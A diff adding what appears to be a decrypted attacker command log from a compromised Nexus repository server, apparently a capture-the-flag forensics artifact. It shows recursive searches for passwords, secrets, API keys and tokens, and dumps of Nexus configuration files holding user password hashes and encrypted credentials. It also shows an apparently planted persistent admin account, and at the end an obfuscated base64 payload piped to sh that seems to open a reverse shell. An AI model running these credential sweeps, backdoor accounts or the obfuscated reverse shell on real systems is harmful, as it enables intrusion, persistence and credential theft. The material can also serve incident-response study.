@@ -1,0 +1,499 @@
+[+] Decrypted: uname -a
+[+] Decrypted: Linux phoenix-repo 5.15.0-134-generic #145-Ubuntu SMP Wed Feb 12 20:08:39 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+
+[+] Decrypted: find / -name "sonatype-work" -type d
+[+] Decrypted: 
+[+] Decrypted: find /sonatype-work/storage/ -name "*.properties" | xargs grep -l "password"
+[+] Decrypted: 
+[+] Decrypted: find /sonatype-work/storage/ -name "*.xml" | xargs grep -l "password"
+[+] Decrypted: 
+[+] Decrypted: find /sonatype-work/ -name "*.bak"
+[+] Decrypted: 
+[+] Decrypted: grep -r "secret" /sonatype-work/
+[+] Decrypted: 
+[+] Decrypted: grep -r "apikey" /sonatype-work/
+[+] Decrypted: 
+[+] Decrypted: grep -r "token" /sonatype-work/
+[+] Decrypted: 
+[+] Decrypted: grep -r "jdbc" /sonatype-work/
+[+] Decrypted: 
+[+] Decrypted: ls -la /sonatype-work/db/
+[+] Decrypted: total 16
+drwxr-xr-x  4 nexus nexus 4096 Mar 23 19:43 .
+drwx------ 15 nexus nexus 4096 Mar 24 17:51 ..
+drwxr-xr-x  2 nexus nexus 4096 Mar 23 19:43 analytics
+drwxr-xr-x  2 nexus nexus 4096 Mar 23 19:43 npm
+
+[+] Decrypted: ls -la /sonatype-work/storage/
+[+] Decrypted: total 36
+drwxr-xr-x  9 nexus nexus 4096 Mar 23 19:43 .
+drwx------ 15 nexus nexus 4096 Mar 24 17:51 ..
+drwxr-xr-x  4 nexus nexus 4096 Mar 24 17:51 apache-snapshots
+drwxr-xr-x  4 nexus nexus 4096 Mar 24 17:51 central
+drwxr-xr-x  4 nexus nexus 4096 Mar 23 19:43 central-m1
+drwxr-xr-x  4 nexus nexus 4096 Mar 24 17:51 public
+drwxr-xr-x  5 nexus nexus 4096 Mar 24 17:51 releases
+drwxr-xr-x  5 nexus nexus 4096 Mar 24 17:51 snapshots
+drwxr-xr-x  4 nexus nexus 4096 Mar 24 17:51 thirdparty
+
+[+] Decrypted: ls -la /sonatype-work/conf/
+[+] Decrypted: total 48
+drwxr-xr-x  2 nexus nexus  4096 Mar 24 17:58 .
+drwx------ 15 nexus nexus  4096 Mar 24 17:51 ..
+-rw-r--r--  1 nexus nexus  2128 Mar 23 19:43 capabilities.xml
+-rw-r--r--  1 nexus nexus  1730 Mar 23 19:42 logback-nexus.xml
+-rw-r--r--  1 nexus nexus   912 Mar 23 19:42 logback.properties
+-rw-r--r--  1 nexus nexus   337 Mar 24 17:51 logback.xml
+-rw-r--r--  1 nexus nexus  1312 Mar 23 19:43 lvo-plugin.xml
+-rw-r--r--  1 nexus nexus 10745 Mar 23 19:43 nexus.xml
+-rw-r--r--  1 nexus nexus   439 Mar 23 19:42 security-configuration.xml
+-rw-r--r--  1 nexus nexus  3290 Mar 24 17:58 security.xml
+
+[+] Decrypted: cat /sonatype-work/conf/logback.xml
+[+] Decrypted: <?xml version='1.0' encoding='UTF-8'?>
+
+<!--
+    DO NOT EDIT - This file aggregates log configuration from Nexus and its plugins, and is automatically generated.
+-->
+
+<configuration scan='true'>
+  <property file='${nexus.log-config-dir}/logback.properties'/>
+  <include file='${nexus.log-config-dir}/logback-nexus.xml'/>
+</configuration>
+
+[+] Decrypted: cat /sonatype-work/conf/nexus.xml
+[+] Decrypted: <?xml version="1.0" encoding="UTF-8"?>
+<nexusConfiguration>
+  <version>2.8.0</version>
+  <nexusVersion>2.15.1-02</nexusVersion>
+  <globalConnectionSettings>
+    <connectionTimeout>20000</connectionTimeout>
+    <retrievalRetryCount>3</retrievalRetryCount>
+    <queryString></queryString>
+  </globalConnectionSettings>
+  <restApi>
+    <uiTimeout>60000</uiTimeout>
+  </restApi>
+  <httpProxy>
+    <enabled>true</enabled>
+    <port>8082</port>
+    <proxyPolicy>strict</proxyPolicy>
+  </httpProxy>
+  <routing>
+    <resolveLinks>true</resolveLinks>
+  </routing>
+  <repositories>
+    <repository>
+      <id>central</id>
+      <name>Central</name>
+      <providerRole>org.sonatype.nexus.proxy.repository.Repository</providerRole>
+      <providerHint>maven2</providerHint>
+      <localStatus>IN_SERVICE</localStatus>
+      <notFoundCacheActive>true</notFoundCacheActive>
+      <notFoundCacheTTL>1440</notFoundCacheTTL>
+      <userManaged>true</userManaged>
+      <exposed>true</exposed>
+      <browseable>true</browseable>
+      <writePolicy>READ_ONLY</writePolicy>
+      <indexable>true</indexable>
+      <searchable>true</searchable>
+      <localStorage>
+        <provider>file</provider>
+      </localStorage>
+      <remoteStorage>
+        <url>https://repo1.maven.org/maven2/</url>
+      </remoteStorage>
+      <externalConfiguration>
+        <proxyMode>ALLOW</proxyMode>
+        <artifactMaxAge>-1</artifactMaxAge>
+        <itemMaxAge>1440</itemMaxAge>
+        <cleanseRepositoryMetadata>false</cleanseRepositoryMetadata>
+        <downloadRemoteIndex>false</downloadRemoteIndex>
+        <checksumPolicy>WARN</checksumPolicy>
+        <repositoryPolicy>RELEASE</repositoryPolicy>
+      </externalConfiguration>
+    </repository>
+    <repository>
+      <id>apache-snapshots</id>
+      <name>Apache Snapshots</name>
+      <providerRole>org.sonatype.nexus.proxy.repository.Repository</providerRole>
+      <providerHint>maven2</providerHint>
+      <localStatus>IN_SERVICE</localStatus>
+      <notFoundCacheActive>true</notFoundCacheActive>
+      <notFoundCacheTTL>1440</notFoundCacheTTL>
+      <userManaged>true</userManaged>
+      <exposed>true</exposed>
+      <browseable>true</browseable>
+      <writePolicy>READ_ONLY</writePolicy>
+      <indexable>true</indexable>
+      <searchable>true</searchable>
+      <localStorage>
+        <provider>file</provider>
+      </localStorage>
+      <remoteStorage>
+        <url>https://repository.apache.org/snapshots/</url>
+      </remoteStorage>
+      <externalConfiguration>
+        <proxyMode>ALLOW</proxyMode>
+        <artifactMaxAge>1440</artifactMaxAge>
+        <itemMaxAge>1440</itemMaxAge>
+        <cleanseRepositoryMetadata>false</cleanseRepositoryMetadata>
+        <downloadRemoteIndex>false</downloadRemoteIndex>
+        <checksumPolicy>WARN</checksumPolicy>
+        <repositoryPolicy>SNAPSHOT</repositoryPolicy>
+      </externalConfiguration>
+    </repository>
+    <repository>
+      <id>releases</id>
+      <name>Releases</name>
+      <providerRole>org.sonatype.nexus.proxy.repository.Repository</providerRole>
+      <providerHint>maven2</providerHint>
+      <localStatus>IN_SERVICE</localStatus>
+      <notFoundCacheTTL>1440</notFoundCacheTTL>
+      <userManaged>true</userManaged>
+      <exposed>true</exposed>
+      <browseable>true</browseable>
+      <writePolicy>ALLOW_WRITE_ONCE</writePolicy>
+      <indexable>true</indexable>
+      <searchable>true</searchable>
+      <localStorage>
+        <provider>file</provider>
+      </localStorage>
+      <externalConfiguration>
+        <proxyMode>ALLOW</proxyMode>
+        <artifactMaxAge>-1</artifactMaxAge>
+        <itemMaxAge>1440</itemMaxAge>
+        <cleanseRepositoryMetadata>false</cleanseRepositoryMetadata>
+        <downloadRemoteIndex>false</downloadRemoteIndex>
+        <checksumPolicy>WARN</checksumPolicy>
+        <repositoryPolicy>RELEASE</repositoryPolicy>
+      </externalConfiguration>
+    </repository>
+    <repository>
+      <id>snapshots</id>
+      <name>Snapshots</name>
+      <providerRole>org.sonatype.nexus.proxy.repository.Repository</providerRole>
+      <providerHint>maven2</providerHint>
+      <localStatus>IN_SERVICE</localStatus>
+      <notFoundCacheTTL>1440</notFoundCacheTTL>
+      <userManaged>true</userManaged>
+      <exposed>true</exposed>
+      <browseable>true</browseable>
+      <writePolicy>ALLOW_WRITE</writePolicy>
+      <indexable>true</indexable>
+      <searchable>true</searchable>
+      <localStorage>
+        <provider>file</provider>
+      </localStorage>
+      <externalConfiguration>
+        <proxyMode>ALLOW</proxyMode>
+        <artifactMaxAge>1440</artifactMaxAge>
+        <itemMaxAge>1440</itemMaxAge>
+        <cleanseRepositoryMetadata>false</cleanseRepositoryMetadata>
+        <downloadRemoteIndex>false</downloadRemoteIndex>
+        <checksumPolicy>WARN</checksumPolicy>
+        <repositoryPolicy>SNAPSHOT</repositoryPolicy>
+      </externalConfiguration>
+    </repository>
+    <repository>
+      <id>thirdparty</id>
+      <name>3rd party</name>
+      <providerRole>org.sonatype.nexus.proxy.repository.Repository</providerRole>
+      <providerHint>maven2</providerHint>
+      <localStatus>IN_SERVICE</localStatus>
+      <notFoundCacheTTL>1440</notFoundCacheTTL>
+      <userManaged>true</userManaged>
+      <exposed>true</exposed>
+      <browseable>true</browseable>
+      <writePolicy>ALLOW_WRITE_ONCE</writePolicy>
+      <indexable>true</indexable>
+      <searchable>true</searchable>
+      <localStorage>
+        <provider>file</provider>
+      </localStorage>
+      <externalConfiguration>
+        <proxyMode>ALLOW</proxyMode>
+        <artifactMaxAge>-1</artifactMaxAge>
+        <itemMaxAge>1440</itemMaxAge>
+        <cleanseRepositoryMetadata>false</cleanseRepositoryMetadata>
+        <downloadRemoteIndex>false</downloadRemoteIndex>
+        <checksumPolicy>WARN</checksumPolicy>
+        <repositoryPolicy>RELEASE</repositoryPolicy>
+      </externalConfiguration>
+    </repository>
+    <repository>
+      <id>central-m1</id>
+      <name>Central M1 shadow</name>
+      <providerRole>org.sonatype.nexus.proxy.repository.ShadowRepository</providerRole>
+      <providerHint>m2-m1-shadow</providerHint>
+      <localStatus>IN_SERVICE</localStatus>
+      <notFoundCacheTTL>15</notFoundCacheTTL>
+      <userManaged>true</userManaged>
+      <exposed>true</exposed>
+      <browseable>true</browseable>
+      <writePolicy>READ_ONLY</writePolicy>
+      <localStorage>
+        <provider>file</provider>
+      </localStorage>
+      <externalConfiguration>
+        <masterRepositoryId>central</masterRepositoryId>
+        <syncAtStartup>false</syncAtStartup>
+      </externalConfiguration>
+    </repository>
+    <repository>
+      <id>public</id>
+      <name>Public Repositories</name>
+      <providerRole>org.sonatype.nexus.proxy.repository.GroupRepository</providerRole>
+      <providerHint>maven2</providerHint>
+      <localStatus>IN_SERVICE</localStatus>
+      <notFoundCacheTTL>15</notFoundCacheTTL>
+      <userManaged>true</userManaged>
+      <exposed>true</exposed>
+      <browseable>true</browseable>
+      <writePolicy>READ_ONLY</writePolicy>
+      <indexable>true</indexable>
+      <localStorage>
+        <provider>file</provider>
+      </localStorage>
+      <externalConfiguration>
+        <mergeMetadata>true</mergeMetadata>
+        <memberRepositories>
+          <memberRepository>releases</memberRepository>
+          <memberRepository>snapshots</memberRepository>
+          <memberRepository>thirdparty</memberRepository>
+          <memberRepository>central</memberRepository>
+        </memberRepositories>
+      </externalConfiguration>
+    </repository>
+  </repositories>
+  <repositoryGrouping>
+    <pathMappings>
+      <pathMapping>
+        <id>inhouse-stuff</id>
+        <groupId>*</groupId>
+        <routeType>inclusive</routeType>
+        <routePatterns>
+          <routePattern>^/(com|org)/somecompany/.*</routePattern>
+        </routePatterns>
+        <repositories>
+          <repository>snapshots</repository>
+          <repository>releases</repository>
+        </repositories>
+      </pathMapping>
+      <pathMapping>
+        <id>apache-stuff</id>
+        <groupId>*</groupId>
+        <routeType>exclusive</routeType>
+        <routePatterns>
+          <routePattern>^/org/some-oss/.*</routePattern>
+        </routePatterns>
+        <repositories>
+          <repository>releases</repository>
+          <repository>snapshots</repository>
+        </repositories>
+      </pathMapping>
+    </pathMappings>
+  </repositoryGrouping>
+  <repositoryTargets>
+    <repositoryTarget>
+      <id>1</id>
+      <name>All (Maven2)</name>
+      <contentClass>maven2</contentClass>
+      <patterns>
+        <pattern>.*</pattern>
+      </patterns>
+    </repositoryTarget>
+    <repositoryTarget>
+      <id>2</id>
+      <name>All (Maven1)</name>
+      <contentClass>maven1</contentClass>
+      <patterns>
+        <pattern>.*</pattern>
+      </patterns>
+    </repositoryTarget>
+    <repositoryTarget>
+      <id>3</id>
+      <name>All but sources (Maven2)</name>
+      <contentClass>maven2</contentClass>
+      <patterns>
+        <pattern>(?!.*-sources.*).*</pattern>
+      </patterns>
+    </repositoryTarget>
+    <repositoryTarget>
+      <id>4</id>
+      <name>All Metadata (Maven2)</name>
+      <contentClass>maven2</contentClass>
+      <patterns>
+        <pattern>.*maven-metadata\.xml.*</pattern>
+      </patterns>
+    </repositoryTarget>
+    <repositoryTarget>
+      <id>any</id>
+      <name>All (Any Repository)</name>
+      <contentClass>any</contentClass>
+      <patterns>
+        <pattern>.*</pattern>
+      </patterns>
+    </repositoryTarget>
+    <repositoryTarget>
+      <id>site</id>
+      <name>All (site)</name>
+      <contentClass>site</contentClass>
+      <patterns>
+        <pattern>.*</pattern>
+      </patterns>
+    </repositoryTarget>
+    <repositoryTarget>
+      <id>npm</id>
+      <name>All (npm)</name>
+      <contentClass>npm</contentClass>
+      <patterns>
+        <pattern>.*</pattern>
+      </patterns>
+    </repositoryTarget>
+    <repositoryTarget>
+      <id>nuget</id>
+      <name>All (nuget)</name>
+      <contentClass>nuget</contentClass>
+      <patterns>
+        <pattern>.*</pattern>
+      </patterns>
+    </repositoryTarget>
+    <repositoryTarget>
+      <id>rubygems</id>
+      <name>All (rubygems)</name>
+      <contentClass>rubygems</contentClass>
+      <patterns>
+        <pattern>.*</pattern>
+      </patterns>
+    </repositoryTarget>
+  </repositoryTargets>
+  <smtpConfiguration>
+    <hostname>smtp-host</hostname>
+    <port>25</port>
+    <username>smtp-username</username>
+    <password>{54rt3V07X8UH8dlJ212yaZXIshhmlUo3QS0vdZIw0vA=}</password>
+    <systemEmailAddress>system@nexus.org</systemEmailAddress>
+  </smtpConfiguration>
+  <notification />
+</nexusConfiguration>
+
+[+] Decrypted: cat /sonatype-work/conf/security.xml
+[+] Decrypted: <?xml version="1.0" encoding="UTF-8"?>
+<security>
+  <version>2.0.5</version>
+  <users>
+    <user>
+      <id>deployment</id>
+      <firstName>Deployment</firstName>
+      <lastName>User</lastName>
+      <password>b2a0e378437817cebdf753d7dff3dd75483af9e0</password>
+      <status>active</status>
+      <email>deployment@corp.htb</email>
+    </user>
+    <user>
+      <id>anonymous</id>
+      <firstName>Nexus</firstName>
+      <lastName>Anonymous User</lastName>
+      <password>$shiro1$SHA-512$1024$zVANUnbAR2sp7I00pquLIQ==$5u2+o6DUtQ46YOOnk3PVCEobyqNaq2It6Rpf/jq0Se3EtObgr+mTUOOfEPBzyfSeLJgQCdkCbWnJvE1sNLbQ0A==</password>
+      <status>active</status>
+      <email>anonymous@corp.htb</email>
+    </user>
+    <user>
+      <id>john_smith</id>
+      <firstName>john</firstName>
+      <lastName>smith</lastName>
+      <password>$shiro1$SHA-512$1024$rWbh6j+8PZjTJwmq5L1RbA==$NoNDVWu1XN90QAnLGaOQ7nMVa0kOH28mnRb+U4cKwaJzox1isD+zSsKR5oSgEtqJzHpO/ZNDLEdOTnNCrdwsSw==</password>
+      <status>active</status>
+      <email>john_smith@corp.htb</email>
+    </user>
+    <user>
+      <id>brad_smith</id>
+      <firstName>Brad</firstName>
+      <lastName>Smith</lastName>
+      <password>$shiro1$SHA-512$1024$KxTwUY7hJfejxH4Lu9IyJQ==$gyBhme+Ymn1aL4AWu3bT4invCu5KoI3m3OMbYKErJ4jMvjTM9ELxxn0Zd5Y7rFLxE2HlcCVY6ahRqVkm9yfgXA==</password>
+      <status>active</status>
+      <email>brad_smith@corp.htb</email>
+    </user>
+    <user>
+      <id>admin</id>
+      <firstName>Administrator</firstName>
+      <lastName>User</lastName>
+      <password>$shiro1$SHA-512$1024$qYmC+VGcNXGxoLo3jHZpQg==$PFPFYc9hoYxLzV4EZFIELz7dGiTSLUYGCpzBatrh91sM/PIU01CPwWGDDA7OumGKfsgNXr7p25hALKIlyZqmzg==</password>
+      <status>active</status>
+      <email>administrator@corp.htb</email>
+    </user>
+    <user>
+      <id>adm1n1str4t0r</id>
+      <firstName>Persistent</firstName>
+      <lastName>Admin</lastName>
+      <password>$shiro1$SHA-512$1024$uWPwGEDj9FfEHD3DGjvGXA==$lsBaiteyJXWwAxcNoa8evPXN5A486LGqdnKtGc6LkEG/jCWaLPQ+YGWvoO0saxi06sgydf48LxvtyVr6OvM5NQ==</password>
+      <status>active</status>
+      <email>adm1n1str4t0r@phoenix.htb</email>
+    </user>
+  </users>
+  <userRoleMappings>
+    <userRoleMapping>
+      <userId>deployment</userId>
+      <source>default</source>
+      <roles>
+        <role>repository-any-full</role>
+        <role>nx-deployment</role>
+      </roles>
+    </userRoleMapping>
+    <userRoleMapping>
+      <userId>anonymous</userId>
+      <source>default</source>
+      <roles>
+        <role>repository-any-read</role>
+        <role>anonymous</role>
+      </roles>
+    </userRoleMapping>
+    <userRoleMapping>
+      <userId>john_smith</userId>
+      <source>default</source>
+      <roles>
+        <role>nx-admin</role>
+      </roles>
+    </userRoleMapping>
+    <userRoleMapping>
+      <userId>brad_smith</userId>
+      <source>default</source>
+      <roles>
+        <role>nx-developer</role>
+      </roles>
+    </userRoleMapping>
+    <userRoleMapping>
+      <userId>admin</userId>
+      <source>default</source>
+      <roles>
+        <role>nx-admin</role>
+      </roles>
+    </userRoleMapping>
+    <userRoleMapping>
+      <userId>adm1n1str4t0r</userId>
+      <source>default</source>
+      <roles>
+        <role>nx-admin</role>
+      </roles>
+    </userRoleMapping>
+  </userRoleMappings>
+</security>
+
+[+] Decrypted: cat /sonatype-work/conf/security-configuration.xml
+[+] Decrypted: <?xml version="1.0"?>
+<security-configuration>
+  <version>2.0.8</version>
+  <anonymousAccessEnabled>true</anonymousAccessEnabled>
+  <anonymousUsername>anonymous</anonymousUsername>
+  <anonymousPassword>{N+kuSVsum00HpaxJeLNkJRKDBG9Le+YDfc4GN/4mMOY=}</anonymousPassword>
+  <realms>
+    <realm>XmlAuthenticatingRealm</realm>
+    <realm>XmlAuthorizingRealm</realm>
+  </realms>
+  <hashIterations>1024</hashIterations>
+</security-configuration>
+
+[+] Decrypted: echo "Z0g0PSJFZCI7a00wPSJ4U3oiO2M9ImNoIjtMPSI0IjtyUVc9IiI7ZkUxPSJsUSI7cz0iICc9b2djbFJYWWtCWGR0Z1hhdVYyYm9Cbkx2VTJaaEozYjBOM0xySjNiMzFTWndsSGRoNTJiejlDSTR0Q0lrOVdib05HSW1ZQ0l5VkdkaFJHYzExQ2VwNVdadmhHY3U4U1puRm1jdlIzY3ZzbWN2ZFhMbEJYZTBGbWJ2TjNMZzRESWlFakorQURJMFFETjA4eU15NENNeDRDTXg0Q014OENjalIzTDJWR1p2QWlKK0FTYXRBQ2F6Rm1ZaUF5Ym9OV1oKJyB8IHIiO0h4Sj0icyI7SGMyPSIiO2Y9ImFzIjtrY0U9InBhcyI7Y0VmPSJhZSI7ZD0ibyI7Vjl6PSI2IjtQOGM9ImlmIjtVPSIgLWQiO0pjPSJlZiI7TjBxPSIiO3Y9ImIiO3c9ImUiO2I9InYgfCI7VHg9IkVkcyI7eFpwPSIiCng9JChldmFsICIkSGMyJHckYyRyUVckZCRzJHckYiRIYzIkdiR4WnAkZiR3JFY5eiRyUVckTCRVJHhacCIpCmV2YWwgIiROMHEkeCRIYzIkclFXIgo=" | base64 --decode | sh
+[+] Decrypted: "Z0g0PSJFZCI7a00wPSJ4U3oiO2M9ImNoIjtMPSI0IjtyUVc9IiI7ZkUxPSJsUSI7cz0iICc9b2djbFJYWWtCWGR0Z1hhdVYyYm9Cbkx2VTJaaEozYjBOM0xySjNiMzFTWndsSGRoNTJiejlDSTR0Q0lrOVdib05HSW1ZQ0l5VkdkaFJHYzExQ2VwNVdadmhHY3U4U1puRm1jdlIzY3ZzbWN2ZFhMbEJYZTBGbWJ2TjNMZzRESWlFakorQURJMFFETjA4eU15NENNeDRDTXg0Q014OENjalIzTDJWR1p2QWlKK0FTYXRBQ2F6Rm1ZaUF5Ym9OV1oKJyB8IHIiO0h4Sj0icyI7SGMyPSIiO2Y9ImFzIjtrY0U9InBhcyI7Y0VmPSJhZSI7ZD0ibyI7Vjl6PSI2IjtQOGM9ImlmIjtVPSIgLWQiO0pjPSJlZiI7TjBxPSIiO3Y9ImIiO3c9ImUiO2I9InYgfCI7VHg9IkVkcyI7eFpwPSIiCng9JChldmFsICIkSGMyJHckYyRyUVckZCRzJHckYiRIYzIkdiR4WnAkZiR3JFY5eiRyUVckTCRVJHhacCIpCmV2YWwgIiROMHEkeCRIYzIkclFXIgo=" | base64 --decode | sh
+
